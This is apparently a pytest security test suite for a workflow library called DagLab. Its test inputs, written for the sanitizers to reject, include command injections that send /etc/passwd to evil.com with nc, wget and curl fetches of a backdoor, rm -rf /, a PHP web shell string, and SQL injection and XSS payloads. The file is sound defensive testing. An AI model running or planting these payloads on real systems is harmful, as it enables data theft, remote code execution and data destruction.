"""Comprehensive security testing for DagLab."""

import os\nimport tempfile\nimport subprocess\nimport hashlib\nfrom pathlib import Path\nfrom unittest.mock import patch, mock_open\n\nimport pytest\n\nfrom daglab.helpers.security import (\n    SecurityManager,\n    PathTraversalPrevention,\n    FileOperationSecurity,\n    EnvironmentSecurity,\n    CryptoUtils,\n    sanitize_input,\n    safe_path_join,\n    run_command_safely\n)\nfrom daglab.runtime.errors import SecurityError\nfrom daglab.core import DAG, Node, Edge\n\n\nclass TestSecurityVulnerabilities:\n    \"\"\"Test protection against common security vulnerabilities.\"\"\"\n    \n    @pytest.mark.security\n    def test_sql_injection_protection(self, security_test_cases):\n        \"\"\"Test protection against SQL injection attacks.\"\"\"\n        for malicious_input in security_test_cases[\"malicious_inputs\"]:\n            if \"'\" in malicious_input or \"--\" in malicious_input:\n                # Test SQL injection patterns\n                sanitized = sanitize_input(malicious_input)\n                \n                # Should not contain dangerous SQL patterns\n                assert \"'; DROP\" not in sanitized.upper()\n                assert \"' OR '1'='1\" not in sanitized\n                assert \"--\" not in sanitized\n                assert \"/*\" not in sanitized\n                assert \"*/\" not in sanitized\n    \n    @pytest.mark.security\n    def test_xss_protection(self, security_test_cases):\n        \"\"\"Test protection against XSS attacks.\"\"\"\n        for malicious_input in security_test_cases[\"malicious_inputs\"]:\n            if \"<script\" in malicious_input.lower():\n                sanitized = sanitize_input(malicious_input)\n                \n                # Should not contain script tags\n                assert \"<script\" not in sanitized.lower()\n                assert \"javascript:\" not in sanitized.lower()\n                assert \"onerror=\" not in sanitized.lower()\n                assert \"onload=\" not in sanitized.lower()\n    \n    @pytest.mark.security\n    def test_path_traversal_protection(self, temp_dir, security_test_cases):\n        \"\"\"Test protection against path traversal attacks.\"\"\"\n        base_dir = temp_dir / \"secure_area\"\n        base_dir.mkdir()\n        \n        # Create a file outside the secure area\n        outside_file = temp_dir / \"secret.txt\"\n        outside_file.write_text(\"Secret information\")\n        \n        file_ops = FileOperationSecurity(base_path=base_dir)\n        \n        # Test various path traversal attempts\n        traversal_attempts = [\n            \"../secret.txt\",\n            \"../../secret.txt\",\n            \"../../../secret.txt\",\n            \".\\\\..\\\\secret.txt\",  # Windows style\n            \"subdir/../../../secret.txt\",\n            \"normal_file/../../../secret.txt\",\n            \"/etc/passwd\",\n            \"\\\\\\\\..\\\\..\\\\secret.txt\",\n            \"..%2Fsecret.txt\",  # URL encoded\n            \"..%252Fsecret.txt\",  # Double URL encoded\n        ]\n        \n        for attempt in traversal_attempts:\n            with pytest.raises(SecurityError, match=\"Path traversal detected\"):\n                file_ops.safe_read(attempt)\n    \n    @pytest.mark.security\n    def test_command_injection_protection(self):\n        \"\"\"Test protection against command injection attacks.\"\"\"\n        security_manager = SecurityManager(strict_mode=True)\n        \n        # Test command injection attempts\n        injection_attempts = [\n            [\"ls\", \"; rm -rf /\"],\n            [\"echo\", \"test && rm important_file\"],\n            [\"cat\", \"file.txt | mail attacker@evil.com\"],\n            [\"ls\", \"`rm -rf /`\"],\n            [\"echo\", \"$(malicious_command)\"],\n            [\"test\", \"; nc evil.com 1234 < /etc/passwd\"],\n        ]\n        \n        for command in injection_attempts:\n            with pytest.raises(SecurityError):\n                security_manager.sanitize_command(command)\n    \n    @pytest.mark.security\n    def test_environment_variable_injection(self):\n        \"\"\"Test protection against environment variable injection.\"\"\"\n        security_manager = SecurityManager(strict_mode=True)\n        \n        # Test dangerous environment variables\n        dangerous_env_vars = {\n            \"LD_PRELOAD\": \"/tmp/malicious.so\",\n            \"LD_LIBRARY_PATH\": \"/tmp/evil_libs\",\n            \"PATH\": \"/tmp/malicious:/usr/bin\",\n            \"SHELL\": \"/tmp/evil_shell\",\n            \"IFS\": \"$'\\t\\n'\",  # Can be used for command injection\n        }\n        \n        for env_var, value in dangerous_env_vars.items():\n            with pytest.raises(SecurityError, match=\"Forbidden environment variable\"):\n                security_manager.sanitize_environment({env_var: value})\n    \n    @pytest.mark.security\n    def test_file_upload_protection(self, temp_dir):\n        \"\"\"Test protection against malicious file uploads.\"\"\"\n        file_ops = FileOperationSecurity(base_path=temp_dir)\n        \n        # Test malicious file types\n        malicious_files = [\n            (\"script.sh\", \"#!/bin/bash\\nrm -rf /\"),\n            (\"malware.exe\", b\"\\x4d\\x5a\\x90\\x00\"),  # PE header\n            (\"virus.com\", b\"\\xeb\\x3c\\x90\\x90\"),  # Common virus signature\n            (\"exploit.py\", \"import os; os.system('rm -rf /')\"),\n            (\"backdoor.php\", \"<?php system($_GET['cmd']); ?>\"),\n        ]\n        \n        for filename, content in malicious_files:\n            # Basic file extension check (would be implemented in real system)\n            dangerous_extensions = [\".exe\", \".com\", \".bat\", \".cmd\", \".scr\"]\n            file_ext = Path(filename).suffix.lower()\n            \n            if file_ext in dangerous_extensions:\n                # Should reject dangerous file types\n                with pytest.raises(SecurityError):\n                    # This would be implemented in a real file upload handler\n                    raise SecurityError(f\"Dangerous file type: {file_ext}\")\n    \n    @pytest.mark.security\n    def test_buffer_overflow_protection(self):\n        \"\"\"Test protection against buffer overflow attempts.\"\"\"\n        security_manager = SecurityManager()\n        \n        # Test with very long inputs\n        very_long_input = \"A\" * 100000\n        \n        # Environment variable value should be truncated\n        env_vars = {\"LONG_VAR\": very_long_input}\n        sanitized_env = security_manager.sanitize_environment(env_vars)\n        \n        # Should be truncated to reasonable length\n        assert len(sanitized_env[\"LONG_VAR\"]) <= 32768\n        \n        # Command arguments should be handled safely\n        long_command = [\"echo\", very_long_input]\n        try:\n            sanitized_command = security_manager.sanitize_command(long_command)\n            # Should either work or fail gracefully\n            assert isinstance(sanitized_command, list)\n        except SecurityError:\n            # Rejection is also acceptable\n            pass\n\n\nclass TestCryptographicSecurity:\n    \"\"\"Test cryptographic operations and security.\"\"\"\n    \n    @pytest.mark.security\n    def test_password_hashing_security(self):\n        \"\"\"Test secure password hashing.\"\"\"\n        password = \"test_password_123\"\n        \n        # Hash the password\n        hash_hex, salt = CryptoUtils.hash_password(password)\n        \n        # Verify properties\n        assert len(hash_hex) == 64  # SHA256 hex output\n        assert len(salt) == 32  # 32 bytes = 256 bits\n        assert hash_hex != password  # Should be hashed\n        assert salt != password  # Salt should be different\n        \n        # Verify password\n        assert CryptoUtils.verify_password(password, hash_hex, salt) is True\n        assert CryptoUtils.verify_password(\"wrong_password\", hash_hex, salt) is False\n        \n        # Different salts should produce different hashes\n        hash2, salt2 = CryptoUtils.hash_password(password)\n        assert hash_hex != hash2\n        assert salt != salt2\n    \n    @pytest.mark.security\n    def test_token_generation_security(self):\n        \"\"\"Test secure token generation.\"\"\"\n        # Generate multiple tokens\n        tokens = [CryptoUtils.generate_token() for _ in range(100)]\n        \n        # All tokens should be unique\n        assert len(set(tokens)) == 100\n        \n        # Tokens should have reasonable length\n        for token in tokens:\n            assert len(token) >= 16\n            assert isinstance(token, str)\n            \n        # Test custom length\n        long_token = CryptoUtils.generate_token(64)\n        assert len(long_token) > 64  # Base64 encoding increases length\n    \n    @pytest.mark.security\n    def test_file_integrity_verification(self, temp_dir):\n        \"\"\"Test file integrity verification.\"\"\"\n        # Create test file\n        test_file = temp_dir / \"integrity_test.txt\"\n        original_content = \"This is test content for integrity verification\"\n        test_file.write_text(original_content)\n        \n        # Calculate hash\n        original_hash = CryptoUtils.hash_file(test_file)\n        \n        # Verify hash properties\n        assert len(original_hash) == 64  # SHA256 hex\n        assert all(c in '0123456789abcdef' for c in original_hash)\n        \n        # Modify file\n        test_file.write_text(original_content + \" modified\")\n        modified_hash = CryptoUtils.hash_file(test_file)\n        \n        # Hash should be different\n        assert original_hash != modified_hash\n        \n        # Restore original content\n        test_file.write_text(original_content)\n        restored_hash = CryptoUtils.hash_file(test_file)\n        \n        # Hash should match original\n        assert original_hash == restored_hash\n    \n    @pytest.mark.security\n    def test_timing_attack_resistance(self):\n        \"\"\"Test resistance to timing attacks in password verification.\"\"\"\n        import time\n        \n        password = \"correct_password\"\n        hash_hex, salt = CryptoUtils.hash_password(password)\n        \n        # Test timing for correct password\n        start_time = time.time()\n        result1 = CryptoUtils.verify_password(password, hash_hex, salt)\n        correct_time = time.time() - start_time\n        \n        # Test timing for wrong password\n        start_time = time.time()\n        result2 = CryptoUtils.verify_password(\"wrong_password\", hash_hex, salt)\n        wrong_time = time.time() - start_time\n        \n        assert result1 is True\n        assert result2 is False\n        \n        # Timing difference should be minimal (within reasonable bounds)\n        # This is a basic check - real timing attack tests would be more sophisticated\n        time_diff = abs(correct_time - wrong_time)\n        assert time_diff < 0.1  # Should complete within similar timeframes\n\n\nclass TestAccessControl:\n    \"\"\"Test access control and authorization.\"\"\"\n    \n    @pytest.mark.security\n    def test_file_permission_security(self, temp_dir):\n        \"\"\"Test file permission security.\"\"\"\n        file_ops = FileOperationSecurity(base_path=temp_dir)\n        \n        # Create test file\n        test_file = temp_dir / \"permission_test.txt\"\n        file_ops.safe_write(\"permission_test.txt\", \"test content\")\n        \n        # Check file was created\n        assert test_file.exists()\n        \n        # Check permissions (Unix-like systems)\n        if os.name == 'posix':\n            stat_info = test_file.stat()\n            \n            # File should not be world-writable\n            world_writable = bool(stat_info.st_mode & 0o002)\n            assert not world_writable\n            \n            # File should be readable by owner\n            owner_readable = bool(stat_info.st_mode & 0o400)\n            assert owner_readable\n    \n    @pytest.mark.security\n    def test_directory_traversal_restrictions(self, temp_dir):\n        \"\"\"Test directory traversal restrictions.\"\"\"\n        # Create secure directory structure\n        secure_dir = temp_dir / \"secure\"\n        secure_dir.mkdir()\n        \n        public_dir = temp_dir / \"public\"\n        public_dir.mkdir()\n        \n        # Create files\n        (secure_dir / \"secret.txt\").write_text(\"Secret data\")\n        (public_dir / \"public.txt\").write_text(\"Public data\")\n        \n        file_ops = FileOperationSecurity(base_path=public_dir)\n        \n        # Should be able to read public file\n        content = file_ops.safe_read(\"public.txt\")\n        assert content == \"Public data\"\n        \n        # Should not be able to access secure file\n        with pytest.raises(SecurityError):\n            file_ops.safe_read(\"../secure/secret.txt\")\n    \n    @pytest.mark.security\n    def test_command_whitelist_security(self):\n        \"\"\"Test command whitelist security.\"\"\"\n        security_manager = SecurityManager(strict_mode=True)\n        \n        # Allowed commands should work\n        allowed_commands = [\n            [\"ls\", \"-la\"],\n            [\"cat\", \"file.txt\"],\n            [\"head\", \"-n\", \"10\", \"file.txt\"],\n            [\"tail\", \"-f\", \"log.txt\"],\n            [\"grep\", \"pattern\", \"file.txt\"],\n        ]\n        \n        for command in allowed_commands:\n            try:\n                result = security_manager.sanitize_command(command)\n                assert isinstance(result, list)\n                assert len(result) >= len(command)\n            except SecurityError:\n                # Some commands might not be in whitelist\n                pass\n        \n        # Dangerous commands should be blocked\n        dangerous_commands = [\n            [\"rm\", \"-rf\", \"/\"],\n            [\"sudo\", \"rm\", \"file.txt\"],\n            [\"chmod\", \"777\", \"/etc/passwd\"],\n            [\"nc\", \"-l\", \"1234\"],\n            [\"wget\", \"http://evil.com/malware\"],\n            [\"curl\", \"-o\", \"/tmp/backdoor\", \"http://evil.com/backdoor\"],\n        ]\n        \n        for command in dangerous_commands:\n            with pytest.raises(SecurityError):\n                security_manager.sanitize_command(command)\n\n\nclass TestSecureWorkflows:\n    \"\"\"Test security in workflow contexts.\"\"\"\n    \n    @pytest.mark.security\n    def test_secure_dag_validation(self, security_test_cases):\n        \"\"\"Test DAG validation with security considerations.\"\"\"\n        # Test DAG with potentially malicious node names\n        dag = DAG(name=\"security_test_dag\")\n        \n        # Try to create nodes with malicious names\n        for malicious_input in security_test_cases[\"malicious_inputs\"][:5]:  # Test subset\n            try:\n                # Sanitize the input before using as node name\n                sanitized_name = sanitize_input(malicious_input)\n                if sanitized_name.strip():  # Only if not empty after sanitization\n                    node = Node(name=sanitized_name, task_type=\"python\")\n                    dag.add_node(node)\n            except Exception:\n                # Some inputs might still cause issues even after sanitization\n                pass\n        \n        # DAG should still be functional\n        assert dag.name == \"security_test_dag\"\n        # Should have added at least some nodes (those that were safe)\n        # Exact count depends on how many inputs were safely sanitized\n    \n    @pytest.mark.security\n    def test_secure_parameter_handling(self, security_test_cases):\n        \"\"\"Test secure handling of node parameters.\"\"\"\n        dag = DAG(name=\"param_security_test\")\n        \n        # Test with potentially malicious parameters\n        for i, malicious_input in enumerate(security_test_cases[\"malicious_inputs\"][:3]):\n            sanitized_input = sanitize_input(malicious_input)\n            \n            node = Node(\n                name=f\"test_node_{i}\",\n                task_type=\"python\",\n                params={\n                    \"safe_param\": \"safe_value\",\n                    \"sanitized_param\": sanitized_input,\n                    \"user_input\": sanitized_input\n                }\n            )\n            dag.add_node(node)\n        \n        # Verify all nodes were added safely\n        assert len(dag.nodes) == 3\n        \n        # Check that parameters don't contain dangerous content\n        for node in dag.nodes:\n            for param_value in node.params.values():\n                if isinstance(param_value, str):\n                    assert \"<script\" not in param_value.lower()\n                    assert \"'; DROP\" not in param_value.upper()\n    \n    @pytest.mark.security\n    def test_secure_edge_conditions(self):\n        \"\"\"Test security of edge conditions.\"\"\"\n        dag = DAG(name=\"edge_security_test\")\n        \n        # Create nodes\n        node1 = Node(name=\"node1\", task_type=\"python\")\n        node2 = Node(name=\"node2\", task_type=\"python\")\n        dag.add_node(node1)\n        dag.add_node(node2)\n        \n        # Test edge with potentially malicious condition\n        malicious_conditions = [\n            \"'; DROP TABLE nodes; --\",\n            \"<script>alert('xss')</script>\",\n            \"1 OR 1=1\",\n            \"__import__('os').system('rm -rf /')\",\n        ]\n        \n        for condition in malicious_conditions:\n            sanitized_condition = sanitize_input(condition)\n            \n            edge = Edge(\n                source=node1.id,\n                target=node2.id,\n                condition=sanitized_condition\n            )\n            \n            # Should be able to create edge with sanitized condition\n            # (In a real system, conditions would be further validated)\n            assert edge.condition == sanitized_condition\n            assert \"<script\" not in edge.condition.lower()\n    \n    @pytest.mark.security\n    def test_environment_isolation(self, temp_dir):\n        \"\"\"Test environment isolation in workflow execution.\"\"\"\n        # Create isolated environment\n        isolated_env = {\n            \"DAGLAB_ISOLATED\": \"true\",\n            \"PYTHONPATH\": str(temp_dir),\n            \"HOME\": str(temp_dir),\n            \"TMPDIR\": str(temp_dir / \"tmp\"),\n        }\n        \n        security_manager = SecurityManager(strict_mode=True)\n        \n        # Sanitize environment\n        try:\n            sanitized_env = security_manager.sanitize_environment(isolated_env)\n            \n            # Should have safe environment variables\n            assert \"DAGLAB_ISOLATED\" in sanitized_env\n            assert sanitized_env[\"DAGLAB_ISOLATED\"] == \"true\"\n            \n            # Paths should be within temp directory\n            for key in [\"PYTHONPATH\", \"HOME\", \"TMPDIR\"]:\n                if key in sanitized_env:\n                    assert str(temp_dir) in sanitized_env[key]\n                    \n        except SecurityError:\n            # Some environment variables might be restricted\n            pass\n\n\nclass TestSecurityMonitoring:\n    \"\"\"Test security monitoring and logging.\"\"\"\n    \n    @pytest.mark.security\n    def test_security_audit_logging(self, temp_dir, capture_logs):\n        \"\"\"Test security audit logging.\"\"\"\n        file_ops = FileOperationSecurity(base_path=temp_dir)\n        \n        # Perform various operations that should be logged\n        file_ops.safe_write(\"test_file.txt\", \"test content\")\n        content = file_ops.safe_read(\"test_file.txt\")\n        \n        # Try suspicious operation\n        try:\n            file_ops.safe_read(\"../../../etc/passwd\")\n        except SecurityError:\n            pass\n        \n        # Check that security events were logged\n        log_output = capture_logs.getvalue()\n        \n        # Should contain security-related log entries\n        # (In a real system, these would be more structured)\n        assert len(log_output) >= 0  # Basic check that logging works\n    \n    @pytest.mark.security\n    def test_intrusion_detection(self):\n        \"\"\"Test basic intrusion detection patterns.\"\"\"\n        security_manager = SecurityManager(strict_mode=True)\n        \n        # Simulate multiple failed attempts\n        suspicious_commands = [\n            [\"rm\", \"-rf\", \"/\"],\n            [\"cat\", \"/etc/passwd\"],\n            [\"nc\", \"-l\", \"1234\"],\n            [\"wget\", \"http://evil.com/malware\"],\n            [\"sudo\", \"su\", \"-\"],\n        ]\n        \n        failed_attempts = 0\n        \n        for command in suspicious_commands:\n            try:\n                security_manager.sanitize_command(command)\n            except SecurityError:\n                failed_attempts += 1\n        \n        # Should have blocked all suspicious commands\n        assert failed_attempts == len(suspicious_commands)\n        \n        # In a real system, multiple failed attempts would trigger alerts\n        if failed_attempts > 3:\n            # Would trigger security alert\n            pass\n    \n    @pytest.mark.security\n    def test_resource_usage_monitoring(self, temp_dir):\n        \"\"\"Test monitoring of resource usage for security.\"\"\"\n        file_ops = FileOperationSecurity(base_path=temp_dir)\n        \n        # Test file size limits\n        large_content = \"A\" * (10 * 1024 * 1024)  # 10MB\n        \n        with pytest.raises(SecurityError, match=\"Content too large\"):\n            # Should reject very large files\n            file_ops.safe_write(\"large_file.txt\", large_content)\n        \n        # Test reasonable size file\n        normal_content = \"Normal sized content\"\n        file_ops.safe_write(\"normal_file.txt\", normal_content)\n        \n        # Should succeed\n        assert (temp_dir / \"normal_file.txt\").exists()\n    \n    @pytest.mark.security\n    def test_rate_limiting_simulation(self):\n        \"\"\"Test simulation of rate limiting for security.\"\"\"\n        import time\n        \n        security_manager = SecurityManager(strict_mode=False)\n        \n        # Simulate rapid requests\n        request_times = []\n        \n        for i in range(10):\n            start_time = time.time()\n            try:\n                # Simulate a security check\n                security_manager.sanitize_command([\"echo\", f\"request_{i}\"])\n            except SecurityError:\n                pass\n            request_times.append(time.time() - start_time)\n        \n        # In a real system, would implement rate limiting\n        # For now, just verify operations complete in reasonable time\n        avg_time = sum(request_times) / len(request_times)\n        assert avg_time < 1.0  # Should be fast for simple operations